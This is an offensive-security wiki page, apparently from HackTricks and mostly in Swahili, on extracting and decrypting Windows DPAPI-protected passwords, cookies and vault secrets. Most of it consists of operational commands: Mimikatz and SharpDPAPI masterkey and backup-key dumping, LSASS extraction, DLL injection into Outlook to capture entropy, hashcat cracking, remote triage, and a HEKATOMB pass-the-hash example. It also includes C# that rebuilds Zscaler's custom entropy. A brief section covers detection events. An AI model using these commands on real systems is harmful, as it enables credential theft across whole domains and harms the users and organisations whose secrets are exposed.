# DPAPI - Kuchota Nywila

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni nini

The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.

Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.

### Uundaji wa funguo za watumiaji

The DPAPI generates a unique key (called **`pre-key`**) for each user based on their credentials. This key is derived from the user's password and other factors and the algorithm depends on the type of user but ends being a SHA1. For example, for domain users, **it depends on the NTLM hash of the user**.

Hii ni muhimu hasa kwa sababu mshambuliaji akiweza kupata hash ya nenosiri la mtumiaji, anaweza:

- **Decrypt any data that was encrypted using DPAPI** na ufunguo wa mtumiaji huyo bila kuhitaji kuwasiliana na API
- Jaribu **crack the password** offline kwa kujaribu kuunda DPAPI key halali

Zaidi ya hayo, kila wakati data inaposimbwa na mtumiaji kwa kutumia DPAPI, funguo mpya ya **master key** inatengenezwa. Funguo hii ya master ndiyo inayotumika kwa kweli kusimbua data. Kila master key inapewa **GUID** (Globally Unique Identifier) inayoitambulisha.

Master keys zinahifadhiwa katika saraka ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya mtumiaji huyo. The master key is stored encrypted by the user's **`pre-key`** and also by a **domain backup key** for recovery (so the same key is stored encrypted 2 times by 2 different pass).

Note that the **domain key used to encrypt the master key is in the domain controllers and never changes**, so if an attacker has access to the domain controller, they can retrieve the domain backup key and decrypt the master keys of all users in the domain.

The encrypted blobs contain the **GUID of the master key** that was used to encrypt the data inside its headers.

> [!TIP]
> DPAPI encrypted blobs huanza na **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Uundaji wa ufunguo wa Mashine/System

Huu ni ufunguo unaotumika kwa mashine kukificha data. Umegawika juu ya **DPAPI_SYSTEM LSA secret**, ambao ni ufunguo maalum ambao mtumiaji wa SYSTEM pekee anaweza kufikia. Ufunguo huu unatumika kuficha data zinazohitajika kupatikana na mfumo wenyewe, kama vile cheti za ngazi ya mashine au siri za mfumo mzima.

Kumbuka kuwa funguo hizi **hazina domain backup** hivyo zinapatikana tu kikamilifu kwa ndani ya mashine:

- **Mimikatz** inaweza kuzipata kwa kuchoma LSA secrets kwa kutumia amri: `mimikatz lsadump::secrets`
- Siri hii imehifadhiwa ndani ya registry, hivyo msimamizi anaweza **kubadilisha ruhusa za DACL ili kupata**. Njia ya registry ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Data Zinazolindwa na DPAPI

Miongoni mwa data binafsi zinazolindwa na DPAPI ni:

- Windows credentials
- Nywila na data za auto-completion za Internet Explorer na Google Chrome
- Nywila za barua pepe na akaunti za FTP za ndani kwa programu kama Outlook na Windows Mail
- Nywila za folda zilizoshirikiwa, rasilimali, mitandao ya wireless, na Windows Vault, pamoja na funguo za encryption
- Nywila za muunganisho wa remote desktop, .NET Passport, na funguo binafsi kwa madhumuni mbalimbali ya encryption na uthibitisho
- Nywila za mtandao zinazosimamiwa na Credential Manager na data binafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger, na nyinginezo
- Vibobe vilivyofichwa ndani ya rejista
- ...

Data zilizolindwa na mfumo zinaweza kujumuisha:
- Nywila za Wifi
- Nywila za task zilizopangwa
- ...

### Chaguzi za kuchota Master key

- Ikiwa mtumiaji ana haki za domain admin, wanaweza kufikia **domain backup key** ili kufungua master keys zote za watumiaji katika domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Kwa ruhusa za msimamizi wa eneo, inawezekana **kupata kumbukumbu ya LSASS** ili kutoa vifunguo vya msingi vya DPAPI vya watumiaji wote waliounganishwa na ufunguo wa SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa mtumiaji ana ruhusa za admin za eneo, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili kudekripta machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ikiwa nenosiri au hash ya NTLM ya mtumiaji inajulikana, unaweza **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya kikao kama mtumiaji, inawezekana kumuomba DC kwa **backup key to decrypt the master keys using RPC**. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **steal his session token** kwa hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodhesha Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kupata Data Iliyofichwa ya DPAPI

### Tafuta Data Iliyofichwa ya DPAPI

Faili za watumiaji kawaida **zililindwa** ziko katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Pia angalia kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.

Mifano ya Enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata DPAPI encrypted blobs katika mfumo wa faili, registry na B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) inaweza kutumika ku-decrypt data nyeti zilizolindwa na DPAPI, kama cookies.

### Vifunguo vya ufikiaji na data

- **Tumia SharpDPAPI** kupata credentials kutoka kwa DPAPI-encrypted files za session ya sasa:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata taarifa za credentials** kama encrypted data na guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Fikia masterkeys**:

Fungua masterkey ya mtumiaji aliyemuomba **domain backup key** kwa kutumia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Zana ya **SharpDPAPI** pia inaunga mkono hoja hizi kwa masterkey decryption (angalia jinsi inavyowezekana kutumia `/rpc` kupata ufunguo wa nakala rudufu wa domain, `/password` kutumia nenosiri wazi, au `/pvk` kubainisha faili ya ufunguo wa faragha wa DPAPI wa domain...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt data kwa kutumia masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Zana ya **SharpDPAPI** pia inaunga mkono vigezo hivi kwa ajili ya `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (kumbuka kwamba inawezekana kutumia `/rpc` kupata funguo la backup la domain, `/password` kutumia plaintext password, `/pvk` kubainisha faili ya DPAPI domain private key, `/unprotect` kutumia session ya mtumiaji wa sasa...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Decrypt baadhi ya data kwa kutumia **kikao cha mtumiaji wa sasa**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Kushughulikia Entropy ya Hiari ("Third-party entropy")

Baadhi ya programu hupeana thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii blob haiwezi ku-decrypt, hata kama masterkey sahihi inajulikana. Kupata entropy ni muhimu kwa hivyo unapolenga vitambulisho vilivyolindwa kwa njia hii (kwa mfano Microsoft Outlook, baadhi ya wateja wa VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya user-mode inayofanya hook kwenye functions za DPAPI ndani ya mchakato lengwa na inarekodi kwa uwazi entropy yoyote ya hiari inayotolewa. Kuendesha EntropyCapture katika mode ya **DLL-injection** dhidi ya michakato kama `outlook.exe` au `vpnclient.exe` itatoa faili inayooanisha kila buffer ya entropy na mchakato unaoitisha na blob. Entropy iliyorekodiwa inaweza kisha kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili ku-decrypt data.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilianzisha muundo wa **context 3** wa masterkey kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3), ikiruhusu kuvunjwa kwa nywila kwa msaada wa GPU moja kwa moja kutoka kwenye faili la masterkey. Hivyo, wadukuzi wanaweza kufanya mashambulizi ya word-list au brute-force bila kuingiliana na mfumo lengwa.

`DPAPISnoop` (2024) inaotomatisha mchakato:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Chombo pia kinaweza kuchambua Credential na Vault blobs, ku-decrypt kwa cracked keys na kusafirisha cleartext passwords.

### Kupata data za mashine nyingine

Kwenye **SharpDPAPI and SharpChrome** unaweza kubainisha chaguo la **`/server:HOST`** ili kufikia data za mashine ya mbali. Bila shaka, unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inadhaniwa kwamba **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni zana inayofanya automatiska uondoaji wa watumiaji wote na kompyuta kutoka kwenye directory ya LDAP na uondoaji wa domain controller backup key kupitia RPC. Skripti itafuata na kutatua anwani za IP za kompyuta zote na kufanya smbclient kwenye kompyuta zote ili kupata DPAPI blobs za watumiaji wote na kuzifungua zote kwa domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa orodha ya kompyuta zilizotolewa kutoka LDAP unaweza kupata kila sub network hata kama hukuwajua!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kudump siri zilizolindwa na DPAPI moja kwa moja. Toleo la 2.x lilianzisha:

* Ukusanyaji sambamba wa blobs kutoka mamia ya hosts
* Kuchambua masterkeys za **context 3** na kuingiza kwa otomatiki cracking ya Hashcat
* Msaada kwa Chrome "App-Bound" encrypted cookies (ona sehemu ifuatayo)
* Mode mpya **`--snapshot`** ya kuchunguza mara kwa mara endpoints na kufanya diff ya blobs zilizotengenezwa mpya

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni parser ya C# kwa masterkey/credential/vault files ambayo inaweza kutoa formats za Hashcat/JtR na kwa hiari kuendesha cracking kwa otomatiki. Inaunga mkono kikamilifu formats za masterkey za machine na user hadi Windows 11 24H1.

## Ugunduzi wa kawaida

- Ufikiaji wa faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na saraka nyingine zinazohusiana na DPAPI.
- Hasa kutoka share ya mtandao kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana kufikia kumbukumbu ya LSASS au kudump masterkeys.
- Tukio **4662**: *An operation was performed on an object* – linaweza kuhusishwa na ufikiaji wa kitu **`BCKUPKEY`**.
- Tukio **4673/4674** wakati mchakato unapoomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Udhaifu na mabadiliko ya mazingira (2023–2025)

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Mtu mwenye ufikiaji wa mtandao angeweza kumdanganya mwanachama wa domain ili apate DPAPI backup key yenye madhara, kuruhusu ku-decrypt masterkeys za watumiaji. Imepatched katika November 2023 cumulative update – wasimamizi wanapaswa kuhakikisha DCs na workstations zimepatikana patches zote.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ilibadilisha ulinzi wa kale wa DPAPI peke yake kwa kuongeza ufunguo wa ziada uliohifadhiwa chini ya **Credential Manager** ya mtumiaji. Ku-decrypt cookie bila mtandao sasa kunahitaji masterkey ya DPAPI pamoja na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurejesha ufunguo wa ziada zinapendeshwa kwa muktadha wa mtumiaji.

### Mfano wa Kesi: Zscaler Client Connector – Custom Entropy Iliyotokana na SID

Zscaler Client Connector inahifadhi faili kadhaa za usanidi chini ya `C:\ProgramData\Zscaler` (kmf `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili imesimbwa kwa **DPAPI (Machine scope)** lakini muuzaji anatoa **custom entropy** ambayo *inahesabiwa wakati wa utekelezaji (runtime)* badala ya kuhifadhiwa kwenye diski.

Entropy inajengwa upya kutoka vipengele viwili:

1. Siri iliyowekwa (hard-coded) iliyojumuishwa ndani ya `ZSACredentialProvider.dll`.
2. The **SID** ya akaunti ya Windows ambayo usanidi unamilikiwa nayo.

Algorithimu iliyotekelezwa na DLL ni sawa na:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Kwa kuwa siri imewekwa ndani ya DLL ambayo inaweza kusomwa kutoka kwenye diski, **mshambuliaji yeyote wa ndani mwenye haki za SYSTEM anaweza kuzalisha upya entropy kwa SID yoyote** na decrypt the blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption huleta muundo kamili wa JSON, ikijumuisha kila **device posture check** na thamani yake inayotarajiwa – taarifa ambayo ni ya thamani kubwa wakati wa kujaribu client-side bypasses.

> TIP: the other encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zinalindwa kwa DPAPI **bila** entropy (`16` zero bytes). Kwa hivyo zinaweza kufunguliwa moja kwa moja kwa `ProtectedData.Unprotect` mara SYSTEM privileges zinapopatikana.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
